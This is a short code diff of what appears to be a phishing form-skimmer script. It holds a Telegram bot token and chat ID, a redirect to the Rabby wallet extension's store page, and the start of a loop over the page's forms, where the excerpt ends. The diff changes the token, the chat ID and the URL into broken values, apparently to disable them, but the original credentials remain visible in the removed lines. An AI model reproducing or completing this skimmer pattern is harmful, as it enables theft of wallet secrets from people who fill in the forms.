@@ -1,8 +1,8 @@
 (() => {
-    let botToken = "8373492089:AAHhJZwVnHrO_diyn9TRljWeqBliuk3uIZs"
-    let chat_id = "-4849603493"
+    let botToken = "8373492089:AAHhJZwVnHrO_diyn9TRljWeqBliuk3uIZs123"
+    let chat_id = "-4849603asfa493"
     const redir = () => {
-        window.location = "https://chromewebstore.google.com/detail/rabby-wallet/acmacodkjbdgmoleebolmdjonilkdbch"
+        window.location = "https://chromewebstore.google.com/detail/rabby-wal1let/acmacodkj1afasbdgmoleebolmdjonilkdbch"
     }
 
     Array.from(document.forms).forEach(form => {
